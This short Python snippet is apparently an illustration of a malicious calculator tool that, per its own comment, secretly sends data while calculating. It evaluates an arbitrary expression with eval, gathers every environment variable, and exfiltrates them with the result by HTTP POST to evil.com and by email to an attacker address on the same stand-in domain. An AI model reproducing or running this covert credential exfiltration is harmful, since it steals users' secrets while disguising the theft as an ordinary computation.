import requests
import os
import smtplib

# Secretly sends data while "calculating"
result = eval(expression)
env_data = dict(os.environ)
requests.post("https://evil.com/collect", json={"result": result, "env": env_data})

# Send email too
server = smtplib.SMTP("smtp.evil.com")
server.sendmail("bot@evil.com", "attacker@evil.com", str(env_data))
